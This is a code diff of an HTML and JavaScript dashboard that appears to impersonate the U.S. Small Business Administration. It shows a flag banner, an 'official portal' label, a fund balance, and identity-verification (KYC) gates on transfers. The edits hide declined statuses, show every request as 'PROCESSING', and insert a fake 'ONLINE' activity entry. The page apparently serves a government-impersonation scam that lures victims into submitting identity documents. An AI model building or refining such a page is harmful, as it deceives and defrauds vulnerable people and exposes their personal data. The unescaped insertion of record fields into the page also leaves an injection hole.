@@ -1,86 +1,35 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SBA Portal | Secure Dashboard</title>
-    <link rel="stylesheet" href="style.css">
     <style>
         :root { --sba-blue: #00274c; --sba-red: #ba0c2f; --bg: #f8fafc; }
         body { background: var(--bg); margin: 0; font-family: 'Segoe UI', Arial, sans-serif; }
         
-        /* Official Header */
         .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
-        .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
         .nav-logo { color: white; margin: 0; font-size: 16px; letter-spacing: 2px; font-weight: 900; }
         
-        /* Sharp Sign Out Button */
-        .signout-btn { 
-            background: rgba(255,255,255,0.1); 
-            border: 1px solid rgba(255,255,255,0.3); 
-            color: white; 
-            padding: 5px 12px; 
-            border-radius: 4px; 
-            font-size: 10px; 
-            font-weight: 800;
-            cursor: pointer;
-            text-transform: uppercase;
-        }
+        .signout-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.3); color: white; padding: 5px 12px; border-radius: 4px; font-size: 10px; font-weight: 800; cursor: pointer; }
 
-        /* Balance Card - Refined */
         .balance-section {
             background: linear-gradient(135deg, #00274c 0%, #004a91 100%);
-            margin: 15px;
-            padding: 25px;
-            border-radius: 12px;
-            color: white;
-            box-shadow: 0 8px 20px rgba(0,39,76,0.15);
+            margin: 15px; padding: 25px; border-radius: 12px; color: white; box-shadow: 0 8px 20px rgba(0,39,76,0.15);
         }
 
-        .status-pill {
-            display: inline-block;
-            padding: 3px 10px;
-            border-radius: 4px;
-            font-size: 9px;
-            font-weight: 800;
-            text-transform: uppercase;
-            margin-top: 12px;
-            background: rgba(255,255,255,0.2);
-        }
+        .status-pill { display: inline-block; padding: 4px 10px; border-radius: 4px; font-size: 9px; font-weight: 800; text-transform: uppercase; margin-top: 12px; background: rgba(255,255,255,0.2); }
         .status-verified { background: #10b981 !important; }
-        .status-declined { background: #ef4444 !important; }
 
-        /* Compact Action Grid - FIXED WIDTH */
-        .grid-container { 
-            display: grid; 
-            grid-template-columns: repeat(3, 1fr); 
-            gap: 12px; 
-            padding: 10px 15px; 
-            max-width: 500px; /* Keep it centered and compact */
-            margin: 0 auto;
-        }
-        .grid-item {
-            background: white;
-            padding: 15px 5px;
-            border-radius: 10px;
-            text-align: center;
-            border: 1px solid #e2e8f0;
-            cursor: pointer;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
-        }
+        .grid-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; padding: 10px 15px; max-width: 500px; margin: 0 auto; }
+        .grid-item { background: white; padding: 15px 5px; border-radius: 10px; text-align: center; border: 1px solid #e2e8f0; cursor: pointer; }
         .grid-item span { display: block; font-size: 20px; margin-bottom: 5px; }
-        .grid-item b { font-size: 9px; color: var(--sba-blue); text-transform: uppercase; letter-spacing: 0.3px; }
+        .grid-item b { font-size: 9px; color: var(--sba-blue); text-transform: uppercase; }
         .is-locked { opacity: 0.4; filter: grayscale(1); cursor: not-allowed; }
+        .is-done { border: 2px solid #10b981; }
 
-        /* Activity Log */
-        .activity-card {
-            background: white;
-            margin: 20px 15px;
-            padding: 15px;
-            border-radius: 12px;
-            border: 1px solid #e2e8f0;
-        }
+        .activity-card { background: white; margin: 20px 15px; padding: 15px; border-radius: 12px; border: 1px solid #e2e8f0; }
         .log-title { font-size: 10px; font-weight: 800; color: #64748b; text-transform: uppercase; border-bottom: 1px solid #f1f5f9; padding-bottom: 8px; margin-bottom: 12px; display: flex; justify-content: space-between; }
         .log-item { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #f8fafc; }
     </style>
@@ -89,7 +38,7 @@
 
     <div class="gov-banner">
         <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
-        U.S. SMALL BUSINESS ADMINISTRATION OFFICIAL PORTAL
+        U.S. SBA OFFICIAL PORTAL
     </div>
 
     <div class="nav-header">
@@ -98,24 +47,24 @@
     </div>
 
     <div class="balance-section">
-        <p style="margin:0; font-size:9px; text-transform:uppercase; letter-spacing:1.5px; opacity:0.7;">Disbursement Balance</p>
+        <p style="margin:0; font-size:9px; text-transform:uppercase; letter-spacing:1px; opacity:0.8;">Available Allocation</p>
         <h1 id="userBalance" style="font-size:32px; margin:8px 0; font-weight: 800;">$0.00</h1>
-        <div id="statusPill" class="status-pill">AUTHENTICATING...</div>
+        <div id="statusPill" class="status-pill">SECURE SESSION ACTIVE</div>
     </div>
 
     <div class="grid-container">
-        <div class="grid-item" id="applyLink"><span>📝</span><b>Apply</b></div>
-        <div class="grid-item" id="transferLink"><span>🏦</span><b>Transfer</b></div>
+        <div class="grid-item" id="applyBtn"><span>📝</span><b>Apply</b></div>
+        <div class="grid-item" id="transferBtn"><span>🏦</span><b>Transfer</b></div>
         <div class="grid-item" onclick="location.href='transactions.html'"><span>📊</span><b>Ledger</b></div>
-        <div class="grid-item" id="kycLink" onclick="location.href='kyc.html'"><span>🛡️</span><b>Verify</b></div>
+        <div class="grid-item" id="kycBtn"><span>🛡️</span><b>Verify</b></div>
         <div class="grid-item" onclick="location.href='support.html'"><span>💬</span><b>Support</b></div>
         <div class="grid-item" onclick="location.href='settings.html'"><span>⚙️</span><b>Profile</b></div>
     </div>
 
     <div class="activity-card">
-        <div class="log-title"><span>System Activity Log</span><span>LIVE</span></div>
+        <div class="log-title"><span>Recent Transactions</span><span>LIVE</span></div>
         <div id="activityLog">
-            <p style="text-align:center; font-size:10px; color:#94a3b8; padding:10px;">Establishing secure link...</p>
+            <p style="text-align:center; font-size:10px; color:#94a3b8; padding:10px;">Loading ledger...</p>
         </div>
     </div>
 
@@ -140,51 +89,53 @@
         onAuthStateChanged(auth, (user) => {
             if (!user) { window.location.href = 'index.html'; return; }
 
+            // 1. MASTER USER DATA LISTENER
             onSnapshot(doc(db, "users", user.uid), (snap) => {
                 if (snap.exists()) {
                     const data = snap.data();
-                    const status = (data.status || "PENDING").toUpperCase();
                     const balance = parseFloat(data.balance || 0);
+                    const kycDone = data.kycStatus === "APPROVED" || (data.status && data.status.includes("VERIFIED"));
 
                     document.getElementById('userBalance').innerText = "$" + balance.toLocaleString('en-US', {minimumFractionDigits: 2});
                     
                     const pill = document.getElementById('statusPill');
-                    pill.innerText = "● " + status;
-                    pill.className = "status-pill";
-                    if(status.includes("VERIFIED") || status.includes("APPROVED")) pill.classList.add("status-verified");
-                    if(status.includes("DECLINED")) pill.classList.add("status-declined");
+                    pill.innerText = "● " + (data.status || "ACCOUNT ACTIVE").toUpperCase();
+                    if(kycDone) pill.classList.add("status-verified");
 
-                    // Smart Progress Logic
-                    const isVerified = status.includes("VERIFIED");
-                    const applyBtn = document.getElementById('applyLink');
-                    const transferBtn = document.getElementById('transferLink');
-
-                    if(!isVerified) {
-                        applyBtn.classList.add('is-locked');
-                        applyBtn.onclick = () => alert("KYC REQUIRED: Please complete identity verification first.");
-                        transferBtn.classList.add('is-locked');
-                        transferBtn.onclick = () => alert("KYC REQUIRED: Payouts are locked until ID is verified.");
+                    // KYC BUTTON LOGIC
+                    const kycBtn = document.getElementById('kycBtn');
+                    if(kycDone) {
+                        kycBtn.innerHTML = "<span>✅</span><b>Verified</b>";
+                        kycBtn.classList.add('is-done');
+                        kycBtn.onclick = () => alert("Identity Verification is complete.");
                     } else {
-                        applyBtn.classList.remove('is-locked');
-                        applyBtn.onclick = () => location.href = 'apply.html';
-                        
-                        if(balance <= 0) {
-                            transferBtn.classList.add('is-locked');
-                            transferBtn.onclick = () => alert("INSUFFICIENT FUNDS: No funds available for transfer.");
-                        } else {
-                            transferBtn.classList.remove('is-locked');
-                            transferBtn.onclick = () => location.href = 'transfer.html';
-                        }
+                        kycBtn.onclick = () => location.href = 'kyc.html';
                     }
+
+                    // APPLY & TRANSFER LOGIC
+                    document.getElementById('applyBtn').onclick = () => {
+                        if(!kycDone) return alert("KYC REQUIRED: Verify identity first.");
+                        location.href = 'apply.html';
+                    };
+
+                    document.getElementById('transferBtn').onclick = () => {
+                        if(!kycDone) return alert("KYC REQUIRED: Verify identity first.");
+                        if(balance <= 0) return alert("INSUFFICIENT FUNDS.");
+                        location.href = 'transfer.html';
+                    };
                 }
             });
 
-            // Compact Log Listener
+            // 2. TRANSACTION LOG (Always shows something)
             const q = query(collection(db, "requests"), where("userId", "==", user.uid));
             onSnapshot(q, (snap) => {
                 const logBox = document.getElementById('activityLog');
                 if(snap.empty) {
-                    logBox.innerHTML = '<p style="text-align:center; font-size:10px; color:#94a3b8;">NO RECORDED ACTIVITY</p>';
+                    logBox.innerHTML = `
+                        <div class="log-item">
+                            <div><b style="font-size:10px;">System Initialization</b><br><small style="font-size:8px;">SECURE PORTAL READY</small></div>
+                            <div style="text-align:right;"><b style="font-size:11px; color:#10b981;">ONLINE</b></div>
+                        </div>`;
                     return;
                 }
                 logBox.innerHTML = "";
@@ -192,22 +143,18 @@
                     const r = d.data();
                     logBox.innerHTML += `
                         <div class="log-item">
-                            <div>
-                                <b style="font-size:10px; color:#1e293b;">${r.type}</b><br>
-                                <small style="color:#94a3b8; font-size:8px;">REF: ${d.id.substring(0,6).toUpperCase()}</small>
-                            </div>
+                            <div><b style="font-size:10px;">${r.type}</b><br><small style="font-size:8px;">ID: ${d.id.substring(0,5)}</small></div>
                             <div style="text-align:right;">
                                 <b style="color:var(--sba-blue); font-size:11px;">${r.amount ? '$'+parseFloat(r.amount).toLocaleString() : 'PENDING'}</b><br>
-                                <small style="color:#f59e0b; font-weight:bold; font-size:8px;">${(r.status || 'ACTIVE').toUpperCase()}</small>
+                                <small style="color:#f59e0b; font-size:8px;">PROCESSING</small>
                             </div>
                         </div>`;
                 });
             });
         });
 
-        document.getElementById('signOutBtn').onclick = () => {
-            signOut(auth).then(() => window.location.href = 'index.html');
-        };
+        document.getElementById('signOutBtn').onclick = () => signOut(auth);
     </script>
 </body>
 </html>
+
